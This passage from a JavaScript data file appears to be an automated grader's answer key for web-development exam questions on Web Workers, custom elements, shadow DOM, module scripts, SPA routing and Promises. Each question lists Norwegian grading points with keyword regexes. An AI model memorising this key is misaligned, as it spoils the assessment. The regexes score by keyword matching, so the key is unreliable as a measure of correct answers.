      { label: "Web Workers har ikke tilgang til DOM", any: ["worker[\\s\\S]{0,80}(no|not|ikke|ingen)[\\s\\S]{0,30}(access|tilgang|dom)"] },
      { label: "Workers kommuniserer via postMessage", any: ["postmessage|message|melding"] }
    ]
  },
  {
    id: "w-define", area: "js", source: "h25 5a", theory: "webcomponents",
    q: "What are the consequences of running customElements.define('message-element', MessageElement)?",
    points: [
      { label: "Lager/registrerer en ny HTML-tag message-element", any: ["(new|ny) (html )?(tag|element)|registers?|registrer"] },
      { label: "Tagen kobles til klassen MessageElement", any: ["associat|connect|link|bind|kobl|knytt"] },
      { label: "Hver bruk av taggen lager en ny instans av klassen", any: ["(every|each|hver)[\\s\\S]{0,80}(instance|instans|object|objekt|forekomst)"] },
      { label: "Konstruktøren kjøres / eksisterende elementer oppgraderes", any: ["constructor|konstruktør|upgrad|oppgrader"] }
    ]
  },
  {
    id: "w-lifecycle", area: "js", source: "h25 5b", theory: "webcomponents",
    q: "When will connectedCallback() run? When will disconnectedCallback() run? Give code that causes the browser to run disconnectedCallback().",
    points: [
      { label: "connectedCallback: når elementet settes inn i DOM/dokumentet", any: ["(inserted|added|appended|connected|satt inn|lagt til)[\\s\\S]{0,60}(dom|document|dokument)"] },
      { label: "disconnectedCallback: når elementet fjernes fra DOM/dokumentet", any: ["(removed|disconnected|fjernet|fjernes)[\\s\\S]{0,60}(dom|document|dokument)"] },
      { label: "Kode: append/appendChild først", any: ["append(child)?\\s*\\("] },
      { label: "Kode: remove()/removeChild()", any: ["remove(child)?\\s*\\(|replacechildren|innerhtml\\s*=\\s*['\"]{2}"] }
    ]
  },
  {
    id: "w-clonenode", area: "js", source: "h25 5c", theory: "webcomponents",
    q: "Why should we use cloneNode() before adding template content to the shadow DOM? What happens to MessageElement if cloneNode() is removed (const content = template.content)?",
    points: [
      { label: "cloneNode(true) lager en dyp kopi for hver instans", any: ["cop(y|ies)|kopi|clone|klon"] },
      { label: "Templaten gjenbrukes uendret", any: ["reus|gjenbruk|unchanged|uendret|intact"] },
      { label: "Uten clone: nodene FLYTTES til første instans", any: ["mov(e|ed)|flytt"] },
      { label: "Templaten blir tom → senere instanser blir tomme", any: ["empty|tom\\b|tomme|nothing|ingenting"] }
    ]
  },
  {
    id: "w-module", area: "js", source: "h25 5d, h21 6c i", theory: "modules",
    q: "<script src=\"components/dice.js\" type=\"module\"></script>: Where would you put this tag (justify)? What are the consequences of type=\"module\"?",
    points: [
      { label: "Plassering: i <head>", any: ["head"] },
      { label: "Begrunnelse: ytelse – nedlasting starter tidlig, parallelt med parsing", any: ["performance|ytelse|early|tidlig|parallel|faster|raskere"] },
      { label: "Kan bruke import/export", any: ["import|export"] },
      { label: "Deferred: kjøres etter at dokumentet er parset (DOM klar)", any: ["defer|after[\\s\\S]{0,40}pars|etter[\\s\\S]{0,40}pars|dom (is )?(ready|built)"] },
      { label: "Strict mode og eget modul-scope", any: ["strict|scope|global"] }
    ]
  },
  {
    id: "w-routing", area: "js", source: "v26 5e, v24 6a ii, h21 6b", theory: "spa",
    q: "What is meant by routing in the context of a SPA? Why do we need routing? What approaches can be used to implement routing in plain JavaScript?",
    points: [
      { label: "Hver tilstand/visning i SPA har sin egen URL", any: ["(own|unique|egen|different)[\\s\\S]{0,30}url|url[\\s\\S]{0,60}(state|view|tilstand|visning)"] },
      { label: "Ingen ny side lastes – JS oppdaterer visningen", any: ["no new page|ikke ny side|without (re)?load|uten (å )?laste|javascript[\\s\\S]{0,60}(update|oppdater)"] },
      { label: "Hvorfor: bokmerker, historikk, back/forward", any: ["bookmark|bokmerk|history|historikk|back|tilbake"] },
      { label: "Hash (#) + hashchange-hendelsen", any: ["hashchange"] },
      { label: "History API: pushState + popstate (+ preventDefault)", any: ["pushstate|popstate|history api"] }
    ]
  },
  {
    id: "w-state-view", area: "js", source: "h25 5e, v24 6a i", theory: "spa",
    q: "JavaScript frameworks can provide synchronization of state and view. What do we mean by state and view? Give an example of synchronization of view from state.",
    points: [
      { label: "State = applikasjonens data/modell i JS", any: ["state[\\s\\S]{0,80}(data|model|modell|variable)"] },
      { label: "View = DOM/det brukeren ser", any: ["view[\\s\\S]{0,80}(dom|html|see|ser|display|ui)"] },
      { label: "View fra state: endring i state oppdaterer view automatisk", any: ["(chang|endr)[\\s\\S]{0,60}state[\\s\\S]{0,80}(update|oppdater|re-?render)"] },
      { label: "Eksempel på klientsiden (React useState / setter / framework)", any: ["usestate|setstate|react|vue|angular|setter|textcontent"] }
    ]
  },
  {
    id: "w-shadow", area: "js", source: "h24 6a i-ii, h22 6b i", theory: "webcomponents",
    q: "What is a shadow DOM and how does it differ from the normal DOM? What are the consequences of mode 'open' vs 'closed'?",
    points: [
      { label: "Separat DOM-tre festet til et element", any: ["separate|separat|attached|festet|own (dom )?tree"] },
      { label: "Innkapsling: CSS/JS fra hoveddokumentet ser ikke inn, og stiler lekker ikke ut", any: ["encapsul|innkaps|hidden|skjult|isolat|clash|kollider|not (see|affect)"] },
      { label: "open: tilgjengelig via element.shadowRoot", any: ["shadowroot"] },
      { label: "closed: shadowRoot er null, bare komponenten har referanse", any: ["closed[\\s\\S]{0,120}(null|not access|ikke tilgang|no access|private)"] }
    ]
  },
  {
    id: "w-promise", area: "js", source: "h24 6a v, h23 6a iii", theory: "async",
    q: "const result = await storagemanager.remove(id); — What kind of object must be returned by storagemanager.remove(id)? Describe this kind of object.",
    points: [
      { label: "En Promise", any: ["promise"] },
      { label: "Representerer et fremtidig resultat av asynkron kode", any: ["future|eventual|fremtid|asynchronous|asynkron"] },
      { label: "Tilstander: pending, fulfilled/resolve, rejected/reject", any: ["resolve|fulfil", "reject"] },
      { label: "then/catch, og await gir den resolvede verdien", any: ["then|catch|resolved value|resolvede verdi"] }
    ]
  }
];
